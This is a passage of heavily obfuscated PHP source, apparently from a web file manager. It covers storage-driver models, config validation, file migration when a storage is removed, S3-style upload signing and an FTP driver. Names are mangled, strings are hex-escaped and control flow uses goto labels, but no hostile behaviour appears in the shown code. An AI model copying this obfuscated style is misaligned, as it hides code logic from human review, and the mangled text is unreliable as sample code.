(!class_exists($•åÕü)) { continue; } $ê¡™ßåÀ[] = $©Ì‡—Şä[$ÓÄ¥ç‚º[492]]; } return $ê¡™ßåÀ; } } goto eï“ÇÂêÂ´; bè×¥Á‘Ôß: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\x2e\x73\x6f\165\x72\143\145\123\145\x63\162\x65\x74\x4c\x69\163\x74"; public $field = array("\163\157\x75\162\143\145\111\x44", "\164\x79\x70\145\x49\104", "\143\x72\x65\141\164\x65\x55\x73\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\x73\164\x6f\162\x61\147\145\x4c\151\x73\164"; public $field = array("\x6e\141\155\x65", "\163\x69\172\x65\115\x61\170", "\163\171\163\164\145\x6d", "\144\145\x66\x61\165\154\164", "\x64\x72\x69\x76\145\x72", "\x63\157\x6e\146\x69\x67"); public function listData($ğÈÇû½ë = false, $ã‡Ğ®‡â = "\x6d\x6f\x64\x69\146\x79\x54\x69\x6d\145", $˜¼³Ä¬¨ = false) { $ä³ãÜ¸‹ =& $_SERVER[áäÒ½¯Ç]; $”ãëóÎå = parent::listData($ğÈÇû½ë, $ã‡Ğ®‡â, $˜¼³Ä¬¨); if ($ğÈÇû½ë) { return $”ãëóÎå; } $ãÒíã° = array(); if ($GLOBALS[$ä³ãÜ¸‹[2468]]) { $ãÒíã° = $this->ioSizeUseGet(array_to_keyvalue($”ãëóÎå, $ä³ãÜ¸‹[12], $ä³ãÜ¸‹[492])); } foreach ($”ãëóÎå as $­ı“ => $ò‘ĞıÍÖ) { unset($”ãëóÎå[$­ı“][$ä³ãÜ¸‹[6]]); $”ãëóÎå[$­ı“][$ä³ãÜ¸‹[2122]] = isset($ãÒíã°[$ò‘ĞıÍÖ[$ä³ãÜ¸‹[492]]]) ? $ãÒíã°[$ò‘ĞıÍÖ[$ä³ãÜ¸‹[492]]] : 0; } return $”ãëóÎå; } public function ioSizeUseGet($Òç«„™’) { $Õó²ô½ó =& $_SERVER[áäÒ½¯Ç]; if (!$Òç«„™’) { return array(); } $êÂ¼áó = $Õó²ô½ó[2469] . implode($Õó²ô½ó[50], $Òç«„™’); $éŠøÏªŠ = Cache::get($êÂ¼áó); if ($éŠøÏªŠ) { return $éŠøÏªŠ; } $É ‘¿ä = array($Õó²ô½ó[928] => $Õó²ô½ó[492], $Õó²ô½ó[2470] => $Õó²ô½ó[79]); $¶¼µòºÄ = array($Õó²ô½ó[928] => array($Õó²ô½ó[7], $Òç«„™’)); $éŠøÏªŠ = Model($Õó²ô½ó[896])->field($É ‘¿ä)->where($¶¼µòºÄ)->group($Õó²ô½ó[928])->select(); $éŠøÏªŠ = array_to_keyvalue($éŠøÏªŠ, $Õó²ô½ó[492], $Õó²ô½ó[79]); Cache::set($êÂ¼áó, $éŠøÏªŠ, 600); return $éŠøÏªŠ; } public function getConfig($„Ïªª·Ì) { $ú¶ÂêÂ = parent::listData($„Ïªª·Ì); $ˆ½œ´ğµ = _get($ú¶ÂêÂ, $_SERVER[áäÒ½¯Ç][6], array()); if ($ˆ½œ´ğµ && !is_array($ˆ½œ´ğµ)) { $ˆ½œ´ğµ = json_decode($ˆ½œ´ğµ, !0); } return $ˆ½œ´ğµ; } public function update($ÖÍ—¤±Ù, $ğºûÕ«½) { $ïÓçò½ =& $_SERVER[áäÒ½¯Ç]; $â¶‰·± = $ğºûÕ«½[$ïÓçò½[32]]; $ôÛÖöõ = array_to_keyvalue(parent::listData(), $ïÓçò½[32]); if (isset($ôÛÖöõ[$â¶‰·±]) && $ôÛÖöõ[$â¶‰·±][$ïÓçò½[492]] != $ÖÍ—¤±Ù) { return !1; } $this->checkPwd($ÖÍ—¤±Ù, $ğºûÕ«½); if (isset($ğºûÕ«½[$ïÓçò½[2471]]) && $ğºûÕ«½[$ïÓçò½[2471]] == $ïÓçò½[91]) { $this->checkConfig($ğºûÕ«½); } unset($ğºûÕ«½[$ïÓçò½[2471]]); $Ìê†éÉ = parent::update($ÖÍ—¤±Ù, $ğºûÕ«½); if ($Ìê†éÉ && $ğºûÕ«½[$ïÓçò½[37]]) { foreach ($ôÛÖöõ as $êÈ³’³¥) { if ($êÈ³’³¥[$ïÓçò½[37]] && $êÈ³’³¥[$ïÓçò½[492]] != $ÖÍ—¤±Ù) { parent::update($êÈ³’³¥[$ïÓçò½[492]], array($ïÓçò½[37] => 0)); } } $this->updateBackup($ÖÍ—¤±Ù, $ôÛÖöõ); } return $Ìê†éÉ; } public function add($›°·¢ğÆ) { $óäùí´ =& $_SERVER[áäÒ½¯Ç]; $üÄûú˜ª = array_to_keyvalue(parent::listData(), $óäùí´[32]); if (isset($üÄûú˜ª[$›°·¢ğÆ[$óäùí´[32]]])) { return !1; } $this->checkConfig($›°·¢ğÆ); $ÖÄ‘õß¾ = parent::insert($›°·¢ğÆ); if ($ÖÄ‘õß¾ && $›°·¢ğÆ[$óäùí´[37]]) { foreach ($üÄûú˜ª as $±ğĞŸÀ÷) { if ($±ğĞŸÀ÷[$óäùí´[37]]) { parent::update($±ğĞŸÀ÷[$óäùí´[492]], array($óäùí´[37] => 0)); } } $this->updateBackup($ÖÄ‘õß¾, $üÄûú˜ª); } return $ÖÄ‘õß¾; } public function updateBackup($¥³êÛá, $¯ª–Û¦) { $™ê…×ğ¯ =& $_SERVER[áäÒ½¯Ç]; if ($¥³êÛá == $™ê…×ğ¯[91]) { return; } $´­™‰£Š = Model($™ê…×ğ¯[850])->config(); $·Ş†ä…ê = $´­™‰£Š[$™ê…×ğ¯[854]]; if ($´­™‰£Š[$™ê…×ğ¯[1897]] != $™ê…×ğ¯[91] || $·Ş†ä…ê == $¥³êÛá) { return; } if ($·Ş†ä…ê != $™ê…×ğ¯[91]) { $Øåî = array(); foreach ($¯ª–Û¦ as $ø»Â¾•ä) { if ($¥³êÛá == $ø»Â¾•ä[$™ê…×ğ¯[492]]) { continue; } $Øåî[] = $ø»Â¾•ä[$™ê…×ğ¯[492]]; } if ($Øåî && in_array($·Ş†ä…ê, $Øåî)) { return; } } $¹Å”÷ÄŞ = Model($™ê…×ğ¯[875])->get($™ê…×ğ¯[882]); $¹Å”÷ÄŞ = json_decode($¹Å”÷ÄŞ, !0); if (!$¹Å”÷ÄŞ) { return; } $¹Å”÷ÄŞ[$™ê…×ğ¯[854]] = $¥³êÛá; Model($™ê…×ğ¯[875])->set(array($™ê…×ğ¯[882] => $¹Å”÷ÄŞ)); } public function checkPwd($í×ëæ„Ï, &$¥†ÇÆ) { $³»¹•Ğ§ =& $_SERVER[áäÒ½¯Ç]; if (empty($¥†ÇÆ[$³»¹•Ğ§[6]])) { return; } $˜ºØ´¨Ï = $¥†ÇÆ[$³»¹•Ğ§[6]]; if (!is_array($˜ºØ´¨Ï)) { $˜ºØ´¨Ï = json_decode($˜ºØ´¨Ï, !0); } $¦®¾–ê = $³»¹•Ğ§[12]; $†•ôÜæ… = array($³»¹•Ğ§[1590], $³»¹•Ğ§[2472], $³»¹•Ğ§[1002]); foreach ($†•ôÜæ… as $æ—¬’í·) { if (isset($˜ºØ´¨Ï[$æ—¬’í·])) { $¦®¾–ê = $æ—¬’í·; break; } } if (!$¦®¾–ê) { return; } $ŠûÔ—¦ = $this->getConfig($í×ëæ„Ï); $ÃîÃã® = $ŠûÔ—¦[$¦®¾–ê]; $‚û‡“ÃÂ = $˜ºØ´¨Ï[$¦®¾–ê]; if ($‚û‡“ÃÂ == str_repeat($³»¹•Ğ§[231], strlen($ÃîÃã®))) { $˜ºØ´¨Ï[$¦®¾–ê] = $ÃîÃã®; $¥†ÇÆ[$³»¹•Ğ§[6]] = json_encode($˜ºØ´¨Ï); } else { if ($‚û‡“ÃÂ != $ÃîÃã®) { $¥†ÇÆ[$³»¹•Ğ§[2471]] = $³»¹•Ğ§[91]; } } } public function checkConfig(&$€¹‚Ãåì, $á§İÈ“Á = false) { $«‡åº¤£ =& $_SERVER[áäÒ½¯Ç]; $÷ª´³’š = strtolower($€¹‚Ãåì[$«‡åº¤£[96]]); $ÜÀÇ— = $€¹‚Ãåì[$«‡åº¤£[6]]; if (!is_array($ÜÀÇ—)) { $ÜÀÇ— = json_decode($ÜÀÇ—, !0); } foreach ($ÜÀÇ— as $±†ûõ·ú => $˜…²ñà×) { if (is_string($˜…²ñà×)) { $ÜÀÇ—[$±†ûõ·ú] = trim($˜…²ñà×); } } $ÜÀÇ—[$«‡åº¤£[2473]] = rand_string(6); $ÓœµÚ…™ = $GLOBALS[$«‡åº¤£[6]][$«‡åº¤£[92]][$«‡åº¤£[936]]; $èìØÏ‘‹ = isset($ÓœµÚ…™[$÷ª´³’š]) ? $ÓœµÚ…™[$÷ª´³’š] : ucfirst($÷ª´³’š); $µ²æ‡Ìœ = $«‡åº¤£[77] . $èìØÏ‘‹; if (!$èìØÏ‘‹ || !class_exists($µ²æ‡Ìœ)) { if ($á§İÈ“Á) { return LNG($«‡åº¤£[2474]); } write_log(array($«‡åº¤£[2475], $€¹‚Ãåì, get_caller_info()), $«‡åº¤£[214]); show_json(LNG($«‡åº¤£[2474]), !1, $€¹‚Ãåì); } $üîö½Åù = new $µ²æ‡Ìœ($ÜÀÇ—); $ŠÒÚÎûÒ = rtrim($ÜÀÇ—[$«‡åº¤£[1315]], $«‡åº¤£[8]) . $«‡åº¤£[8]; if (in_array($÷ª´³’š, $üîö½Åù->objectDriver)) { try { if (!$üîö½Åù->isBucketCors() && !$üîö½Åù->setBucketCors()) { $µ“öåøú = LNG($«‡åº¤£[2476]); $µ“öåøú .= $«‡åº¤£[2477] . LNG($«‡åº¤£[2478]); } } catch (Exception $´œ½»©Å) { $µ“öåøú = $´œ½»©Å->getMessage(); } if (isset($µ“öåøú)) { return $this->_parseError($µ“öåøú, $÷ª´³’š, $á§İÈ“Á); } if ($÷ª´³’š == $«‡åº¤£[68] && !$üîö½Åù->checkRegion()) { return $this->_parseError(LNG($«‡åº¤£[2479]), $÷ª´³’š, $á§İÈ“Á); } } else { if ($÷ª´³’š == $«‡åº¤£[2480]) { if ($üîö½Åù->ftpPath) { $Œ¬„˜¬â = trim($ŠÒÚÎûÒ, $«‡åº¤£[8]); if (stripos($Œ¬„˜¬â, trim($üîö½Åù->ftpPath, $«‡åº¤£[8])) !== 0) { $ŠÒÚÎûÒ = $üîö½Åù->ftpPath . $«‡åº¤£[8] . ($Œ¬„˜¬â ? $Œ¬„˜¬â . $«‡åº¤£[8] : $«‡åº¤£[12]); } } } } $ÁÍœïÇ = $üîö½Åù->getPath($ŠÒÚÎûÒ . $«‡åº¤£[1319]); try { if ($÷ª´³’š == $«‡åº¤£[107]) { $üîö½Åù->mkdir($ŠÒÚÎûÒ); } $ÊŒ™‚Ìú = $üîö½Åù->mkfile($ÁÍœïÇ); if (!$ÊŒ™‚Ìú) { $µ“öåøú = LNG($«‡åº¤£[2476]); } } catch (Exception $´œ½»©Å) { $µ“öåøú = $´œ½»©Å->getMessage(); } if (isset($µ“öåøú)) { return $this->_parseError($µ“öåøú, $÷ª´³’š, $á§İÈ“Á); } $ÜÀÇ—[$«‡åº¤£[1315]] = $ŠÒÚÎûÒ; $€¹‚Ãåì[$«‡åº¤£[6]] = json_encode($ÜÀÇ—); $€¹‚Ãåì[$«‡åº¤£[96]] = $èìØÏ‘‹; return !0; } private function _parseError($•½Úæ·ª, $ÀîÔ÷¼Å, $Ìõ‡òÀ¨ = false) { $•Ê†Å® =& $_SERVER[áäÒ½¯Ç]; if ($ÀîÔ÷¼Å == $•Ê†Å®[68] && stripos($•½Úæ·ª, $•Ê†Å®[2481])) { $¬¤ù½¬ = explode($•Ê†Å®[10], $•½Úæ·ª); $ªõ¿Õ¿ı = isset($¬¤ù½¬[1]) ? $¬¤ù½¬[1] : $•Ê†Å®[12]; $Ë÷ŒÙ÷à = array($•Ê†Å®[2482] => LNG($•Ê†Å®[2483]), $•Ê†Å®[2484] => LNG($•Ê†Å®[2485])); if (isset($Ë÷ŒÙ÷à[$ªõ¿Õ¿ı])) { $•½Úæ·ª = $Ë÷ŒÙ÷à[$ªõ¿Õ¿ı]; } } if (stripos($•½Úæ·ª, $•Ê†Å®[2486]) === 0) { $Š´‰Ä = strpos($•½Úæ·ª, $•Ê†Å®[176]); if ($Š´‰Ä === !1) { $Š´‰Ä = strpos($•½Úæ·ª, $•Ê†Å®[4]); } if ($Š´‰Ä !== !1) { $•½Úæ·ª = substr($•½Úæ·ª, $Š´‰Ä + 1); } } $•½Úæ·ª = LNG($•Ê†Å®[1322]) . $•½Úæ·ª; if ($Ìõ‡òÀ¨) { return $•½Úæ·ª; } show_json($•½Úæ·ª, !1); } public function driverListSystem() { $Ëá–›ƒÁ =& $_SERVER[áäÒ½¯Ç]; $´Ä„ÛÑ = parent::listData(); $«ØåéîÛ = array(); foreach ($´Ä„ÛÑ as $‰°•î‹é) { unset($‰°•î‹é[$Ëá–›ƒÁ[242]], $‰°•î‹é[$Ëá–›ƒÁ[88]]); if (!is_array($‰°•î‹é[$Ëá–›ƒÁ[6]])) { $‰°•î‹é[$Ëá–›ƒÁ[6]] = json_decode($‰°•î‹é[$Ëá–›ƒÁ[6]], !0); } $«ØåéîÛ[] = $‰°•î‹é; } return $«ØåéîÛ; } public function defaultDriver() { $„óÍ²ì„ =& $_SERVER[áäÒ½¯Ç]; $ä•¥¹ˆı = parent::listData(); $áİæ˜Ñş = array_filter_by_field($ä•¥¹ˆı, $„óÍ²ì„[37], 1); $áİæ˜Ñş = $áİæ˜Ñş[0]; if (!$áİæ˜Ñş) { return array(); } if (!is_array($áİæ˜Ñş[$„óÍ²ì„[6]])) { $áİæ˜Ñş[$„óÍ²ì„[6]] = json_decode($áİæ˜Ñş[$„óÍ²ì„[6]], !0); } return $áİæ˜Ñş; } public function driverInfo($Ò’áÊŒÃ) { $ÒãÄ¾Ï· =& $_SERVER[áäÒ½¯Ç]; $åÜ«İÀ = array_to_keyvalue(parent::listData(), $ÒãÄ¾Ï·[492]); if (!isset($åÜ«İÀ[$Ò’áÊŒÃ])) { return !1; } $´åÏÈü® = $åÜ«İÀ[$Ò’áÊŒÃ]; if (!is_array($´åÏÈü®[$ÒãÄ¾Ï·[6]])) { $´åÏÈü®[$ÒãÄ¾Ï·[6]] = json_decode($´åÏÈü®[$ÒãÄ¾Ï·[6]], !0); } return $´åÏÈü®; } public function remove($â–ÁÁ‘) { $this->removeShareItems($â–ÁÁ‘); return parent::remove($â–ÁÁ‘); } public function removeWithFile($à÷ÕúÕÁ, $æ±•òÆÌ, $ı°Š§®, $ğÏ”Ü™î = false) { $ŞÅ©·¿ì =& $_SERVER[áäÒ½¯Ç]; ignore_timeout(); $†å¸‘¢ = array($ŞÅ©·¿ì[928] => $à÷ÕúÕÁ); $ë€µıåì = Model($ŞÅ©·¿ì[565]); if (isset($GLOBALS[$ŞÅ©·¿ì[2487]])) { $Ñ¾ù‹Åè = $GLOBALS[$ŞÅ©·¿ì[2487]]; } else { $Ñ¾ù‹Åè = $ë€µıåì->where($†å¸‘¢)->field(array($ŞÅ©·¿ì[2384] => $ŞÅ©·¿ì[2089], $ŞÅ©·¿ì[2459] => $ŞÅ©·¿ì[79]))->find(); } $Ì¨Ÿğ¼Â = intval($Ñ¾ù‹Åè[$ŞÅ©·¿ì[2089]]); $„ÔÊõˆ = intval($Ñ¾ù‹Åè[$ŞÅ©·¿ì[79]]); $ôÈãôÁ¹ = $æ±•òÆÌ . $ŞÅ©·¿ì[2488] . $à÷ÕúÕÁ; $¦ø¿ğñö = LNG($æ±•òÆÌ == $ŞÅ©·¿ì[648] ? $ŞÅ©·¿ì[2489] : $ŞÅ©·¿ì[2490]); $óÄÛíÔ = new TaskFileTransfer($ôÈãôÁ¹, $ŞÅ©·¿ì[214], $Ì¨Ÿğ¼Â, $¦ø¿ğñö . $ŞÅ©·¿ì[482] . $ı°Š§®[$ŞÅ©·¿ì[32]] . $ŞÅ©·¿ì[213] . $à÷ÕúÕÁ); $óÄÛíÔ->task[$ŞÅ©·¿ì[866]] = (double) $„ÔÊõˆ; $›Ù–¬Â‘ = KodIO::defaultDriver(); $¬œ±ì» = $›Ù–¬Â‘[$ŞÅ©·¿ì[492]]; $ê€ŸåŒì = 1; $û‰—ŠÌ« = 5000; $“¦áÇ®À = $±°±Ï’– = $‘ùêúÈÑ = array(); $¾¦’‘æ– = $ë€µıåì->where($†å¸‘¢)->field($ŞÅ©·¿ì[2491])->selectPage($û‰—ŠÌ«, $ê€ŸåŒì); $ßãôáÏÊ = intval($¾¦’‘æ–[$ŞÅ©·¿ì[452]][$ŞÅ©·¿ì[454]]); while ($¾¦’‘æ– && $ê€ŸåŒì <= $ßãôáÏÊ) { foreach ($¾¦’‘æ–[$ŞÅ©·¿ì[455]] as $ĞóÚ«Ä‘) { $ûäúÄ×Ÿ = $ĞóÚ«Ä‘[$ŞÅ©·¿ì[562]]; if ($ğÏ”Ü™î) { $±°±Ï’–[] = $ûäúÄ×Ÿ; continue; } $ùöšµ„º = $ĞóÚ«Ä‘[$ŞÅ©·¿ì[87]]; $„ØÒ¶Ú» = get_path_father($ùöšµ„º); $‘ùêúÈÑ[] = $„ØÒ¶Ú»; $„ØÒ¶Ú» = str_replace("\x7b\151\157\72{$à÷ÕúÕÁ}\175\x2f", "\173\x69\x6f\72{$¬œ±ì»}\175\57", $„ØÒ¶Ú»); if (!IO::exist($ùöšµ„º)) { $“¦áÇ®À[] = $ûäúÄ×Ÿ; $óÄÛíÔ->updateFileEnd($ĞóÚ«Ä‘[$ŞÅ©·¿ì[32]], $ĞóÚ«Ä‘[$ŞÅ©·¿ì[79]]); write_log($ŞÅ©·¿ì[2492] . $ùöšµ„º, $ŞÅ©·¿ì[2068]); continue; } $óü“•œ€ = IO::move($ùöšµ„º, $„ØÒ¶Ú», REPEAT_RENAME); if (!$óü“•œ€) { $±°±Ï’–[] = $ûäúÄ×Ÿ; $óÄÛíÔ->updateFileEnd($ĞóÚ«Ä‘[$ŞÅ©·¿ì[32]], $ĞóÚ«Ä‘[$ŞÅ©·¿ì[79]]); write_log($ŞÅ©·¿ì[2493] . $ùöšµ„º, $ŞÅ©·¿ì[2068]); continue; } $ÅĞŒÛ¯À = array($ŞÅ©·¿ì[928] => $¬œ±ì», $ŞÅ©·¿ì[87] => $óü“•œ€); $ë€µıåì->where(array($ŞÅ©·¿ì[562] => $ûäúÄ×Ÿ))->save($ÅĞŒÛ¯À); } $ê€ŸåŒì++; $¾¦’‘æ– = $ë€µıåì->where($†å¸‘¢)->field($ŞÅ©·¿ì[2491])->selectPage($û‰—ŠÌ«, $ê€ŸåŒì); } $òÔİ¾Ğ = $óÄÛíÔ->task; if (!$ğÏ”Ü™î) { Cache::set($ôÈãôÁ¹, $òÔİ¾Ğ); } $óÄÛíÔ->end(); $“¦áÇ®À = array_unique($“¦áÇ®À); $±°±Ï’– = array_unique($±°±Ï’–); if (!$ğÏ”Ü™î && ($“¦áÇ®À || $±°±Ï’–)) { $¥İÇ»š¶ = array(); if ($“¦áÇ®À) { $¥İÇ»š¶[] = sprintf(LNG($ŞÅ©·¿ì[2494]), count($“¦áÇ®À)); } if ($±°±Ï’–) { $¥İÇ»š¶[] = sprintf(LNG($ŞÅ©·¿ì[2495]), count($±°±Ï’–)); } $¥İÇ»š¶ = sprintf(LNG($ŞÅ©·¿ì[2496]), implode($ŞÅ©·¿ì[1536], $¥İÇ»š¶)) . $ŞÅ©·¿ì[2497] . date($ŞÅ©·¿ì[2498]) . $ŞÅ©·¿ì[2499]; if ($æ±•òÆÌ == $ŞÅ©·¿ì[1280]) { $¥İÇ»š¶ .= $ŞÅ©·¿ì[2500] . LNG($ŞÅ©·¿ì[2501]); } else { $¥İÇ»š¶ = LNG($ŞÅ©·¿ì[2502]) . $ŞÅ©·¿ì[2503] . $¥İÇ»š¶; } $òÔİ¾Ğ[$ŞÅ©·¿ì[1317]] = $¥İÇ»š¶; Cache::set($ôÈãôÁ¹, $òÔİ¾Ğ); unset($ı°Š§®[$ŞÅ©·¿ì[6]]); $ïŒÌ÷ğé = array($ŞÅ©·¿ì[492] => $à÷ÕúÕÁ, $ŞÅ©·¿ì[2373] => $ŞÅ©·¿ì[648], $ŞÅ©·¿ì[32] => $ı°Š§®[$ŞÅ©·¿ì[32]], $ŞÅ©·¿ì[96] => $ı°Š§®[$ŞÅ©·¿ì[96]]); Hook::trigger($ŞÅ©·¿ì[1937], array($ŞÅ©·¿ì[1339] => $ïŒÌ÷ğé, $ŞÅ©·¿ì[1349] => !0)); show_json($¥İÇ»š¶, !1, 100111); } if ($æ±•òÆÌ == $ŞÅ©·¿ì[648]) { return !0; } if ($“¦áÇ®À || $±°±Ï’–) { $·•¥± = array_merge($“¦áÇ®À, $±°±Ï’–); $·•¥± = array_filter(array_unique($·•¥±)); $this->removeByFileID($·•¥±); } if ($‘ùêúÈÑ) { $‘ùêúÈÑ = array_filter(array_unique($‘ùêúÈÑ)); foreach ($‘ùêúÈÑ as $ùöšµ„º) { $Ñ¾ù‹Åè = IO::has($ùöšµ„º, !0); if (!$Ñ¾ù‹Åè[$ŞÅ©·¿ì[250]] && !$Ñ¾ù‹Åè[$ŞÅ©·¿ì[251]]) { IO::remove($ùöšµ„º); } } } return $this->remove($à÷ÕúÕÁ); } private function removeByFileID($€á†´¨ = array()) { $šÄáŞõ =& $_SERVER[áäÒ½¯Ç]; if (empty($€á†´¨)) { return; } $Ë¨ãÁ = array($šÄáŞõ[562] => array($šÄáŞõ[7], $€á†´¨)); $úÄÙÕÂÏ = Model($šÄáŞõ[1482])->where($Ë¨ãÁ)->field($šÄáŞõ[2448])->select(); if (!$úÄÙÕÂÏ) { return Model($šÄáŞõ[565])->remove($€á†´¨); } $úÄÙÕÂÏ = array_to_keyvalue($úÄÙÕÂÏ, $šÄáŞõ[192], $šÄáŞõ[562]); foreach ($úÄÙÕÂÏ as $¤ãüÕÄ¨ => $íÌÜ—±ê) { Model($šÄáŞõ[935])->removeNow($¤ãüÕÄ¨, !1); } $Ëòò§ÅÁ = array_diff($€á†´¨, array_unique(array_values($úÄÙÕÂÏ))); if ($Ëòò§ÅÁ) { return Model($šÄáŞõ[565])->remove($Ëòò§ÅÁ); } } private function removeShareItems($ßœËó×) { $û˜íãï´ =& $_SERVER[áäÒ½¯Ç]; $Èéõü‚ = "\173\151\x6f\x3a{$ßœËó×}\175\x2f"; $·ÓÒ¼Ï = array($û˜íãï´[192] => 0, $û˜íãï´[588] => array($û˜íãï´[479], "{$Èéõü‚}\x25")); $Ù‹ì†¼ = Model($û˜íãï´[1512])->where($·ÓÒ¼Ï)->field($û˜íãï´[693])->select(); if (empty($Ù‹ì†¼)) { return; } $’Í®–ÆÎ = array_to_keyvalue($Ù‹ì†¼, $û˜íãï´[12], $û˜íãï´[693]); Model($û˜íãï´[692])->remove($’Í®–ÆÎ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\x2e\114\x69\x67\150\164\x41\x70\x70"; public $modelType = "\x53\x79\163\164\x65\x6d\117\x70\x74\x69\157\x6e"; public $field = array("\156\141\x6d\145", "\147\162\157\165\160", "\144\x65\x73\x63", "\143\x6f\x6e\x74\145\x6e\164"); public function listData($ìª¾åÓ’ = false, $¦‰ùËÍ = "\x6d\x6f\144\151\x66\x79\x54\151\x6d\145", $ŞŒ×öé = true) { return parent::listData($ìª¾åÓ’, $¦‰ùËÍ, $ŞŒ×öé); } public function remove($¯ôÏ¸ª) { $“•µÖãµ = $this->findByName($¯ôÏ¸ª); if (!$“•µÖãµ) { return !1; } return parent::remove($“•µÖãµ[$_SERVER[áäÒ½¯Ç][492]]); } public function add($û£ù²şì) { if ($this->findByName($û£ù²şì[$_SERVER[áäÒ½¯Ç][32]])) { return !1; } return parent::insert($û£ù²şì); } public function update($êØóÂ, $ƒßÖÊÜ³) { $šÂ™ïƒø =& $_SERVER[áäÒ½¯Ç]; $ÌÄÑ®äü = $this->findByName($êØóÂ); $­¼ƒŠæ½ = $this->findByName($ƒßÖÊÜ³[$šÂ™ïƒø[32]]); if (!$ÌÄÑ®äü || $­¼ƒŠæ½ && $­¼ƒŠæ½[$šÂ™ïƒø[492]] != $ÌÄÑ®äü[$šÂ™ïƒø[492]]) { return !1; } return parent::update($ÌÄÑ®äü[$šÂ™ïƒø[492]], $ƒßÖÊÜ³); } } goto bØ×Èâ®ì; b’°²¤•íö: class PathDriverEDS extends PathDriverBaseS3 { public function __construct($ôÎÓµ’ó) { parent::__construct($ôÎÓµ’ó); $this->setSignVersion($_SERVER[áäÒ½¯Ç][258]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($©éçöÖ‚) { parent::__construct($©éçöÖ‚); $this->setSignVersion($_SERVER[áäÒ½¯Ç][258]); } public function uploadFormData($³ÎïÁ×, $è…ş¨Ç = 3600) { $¢€ø³Œ =& $_SERVER[áäÒ½¯Ç]; $’‚ö¡é = $¢€ø³Œ[240]; $²³ÄÛÁ‡ = $¢€ø³Œ[268]; $À»‡ùÅ = $¢€ø³Œ[62]; $÷³éÄ†© = gmdate($¢€ø³Œ[269]); $™›–©è = gmdate($¢€ø³Œ[270]); $ã’¶„î = $¢€ø³Œ[271]; $ÕŠÌˆÌ¦ = $è…ş¨Ç . $¢€ø³Œ[12]; $»ïşÑ‡ = $¢€ø³Œ[272]; $°òÊ…ö³ = array($this->accessKey, $™›–©è, $this->region, $À»‡ùÅ, $ã’¶„î); $Ë¹ıöê‡ = implode($¢€ø³Œ[8], $°òÊ…ö³); $ØŒİ…Ş = array($¢€ø³Œ[273] => gmdate($¢€ø³Œ[1474], strtotime($¢€ø³Œ[275])), $¢€ø³Œ[276] => array(array($¢€ø³Œ[277] => $this->bucket), array($¢€ø³Œ[316] => $’‚ö¡é), array($¢€ø³Œ[278], $¢€ø³Œ[279], $¢€ø³Œ[12]), array($¢€ø³Œ[278], $¢€ø³Œ[280], $¢€ø³Œ[12]), array($¢€ø³Œ[278], $¢€ø³Œ[317], $¢€ø³Œ[12]), array($¢€ø³Œ[281] => $»ïşÑ‡), array($¢€ø³Œ[282] => $Ë¹ıöê‡), array($¢€ø³Œ[283] => $²³ÄÛÁ‡), array($¢€ø³Œ[284] => $÷³éÄ†©), array($¢€ø³Œ[285] => $ÕŠÌˆÌ¦))); $ûµß éÕ = base64_encode(json_encode($ØŒİ…Ş)); $âğœ¥áİ = hash_hmac($¢€ø³Œ[286], $™›–©è, $¢€ø³Œ[287] . $this->secret, !0); $¡ËšÇ±¶ = hash_hmac($¢€ø³Œ[286], $this->region, $âğœ¥áİ, !0); $ÕªˆÄ®¤ = hash_hmac($¢€ø³Œ[286], $À»‡ùÅ, $¡ËšÇ±¶, !0); $óùà—èŞ = hash_hmac($¢€ø³Œ[286], $ã’¶„î, $ÕªˆÄ®¤, !0); $ã Õ¹˜ = hash_hmac($¢€ø³Œ[286], $ûµß éÕ, $óùà—èŞ); $—°ç÷ß = array($¢€ø³Œ[257] => $¢€ø³Œ[12], $¢€ø³Œ[304] => $¢€ø³Œ[12], $¢€ø³Œ[316] => $’‚ö¡é, $¢€ø³Œ[281] => $»ïşÑ‡, $¢€ø³Œ[288] => $ûµß éÕ, $¢€ø³Œ[318] => $Ë¹ıöê‡, $¢€ø³Œ[319] => $²³ÄÛÁ‡, $¢€ø³Œ[320] => $÷³éÄ†©, $¢€ø³Œ[321] => $ÕŠÌˆÌ¦, $¢€ø³Œ[322] => $ã Õ¹˜, $¢€ø³Œ[207] => $this->getHost()); return $—°ç÷ß; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($¶Êç¸Ò¥) { parent::__construct(); if (count($¶Êç¸Ò¥) > 0) { $this->_init($¶Êç¸Ò¥); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ØşÓ×®Ë) { $™‘Ö‚Äª =& $_SERVER[áäÒ½¯Ç]; global $config; $this->appCharset = $config[$™‘Ö‚Äª[1595]]; $this->systemCharset = $config[$™‘Ö‚Äª[1596]]; if (isset($ØşÓ×®Ë[$™‘Ö‚Äª[1597]]) && $ØşÓ×®Ë[$™‘Ö‚Äª[1597]]) { $this->systemCharset = $ØşÓ×®Ë[$™‘Ö‚Äª[1597]]; } } public function iconvApp($é–Ÿô¤°) { return $this->iconvTo($é–Ÿô¤°, $this->systemCharset, $this->appCharset); } public function iconvSystem($Áé§—¶) { return $this->iconvTo($Áé§—¶, $this->appCharset, $this->systemCharset); } public function getPathOuter($ùÑĞò¤) { $ °…öóá =& $_SERVER[áäÒ½¯Ç]; $ª‚²ùÒã = $this->iconvApp($this->pathBase); $ùÑĞò¤ = $this->iconvApp($ùÑĞò¤); if (substr($ª‚²ùÒã, 0, 2) == $ °…öóá[1472]) { $ª‚²ùÒã = BASIC_PATH . substr($ª‚²ùÒã, 2); } if (substr($ùÑĞò¤, 0, 2) == $ °…öóá[1472]) { $ùÑĞò¤ = BASIC_PATH . substr($ùÑĞò¤, 2); } $ª‚²ùÒã = KodIO::clear($ª‚²ùÒã); $ùÑĞò¤ = KodIO::clear($ùÑĞò¤); $ùÑĞò¤ = substr($ùÑĞò¤, strlen($ª‚²ùÒã)); if (empty($this->pathDriver)) { return $ùÑĞò¤; } return $this->pathDriver . $ °…öóá[8] . ltrim($ùÑĞò¤, $ °…öóá[8]); } private function _init($—‡¯Íğ = array()) { $–Ëõ°–• =& $_SERVER[áäÒ½¯Ç]; if (!function_exists($–Ëõ°–•[1598])) { throw new Exception(LNG($–Ëõ°–•[1599])); } $this->config = $—‡¯Íğ; 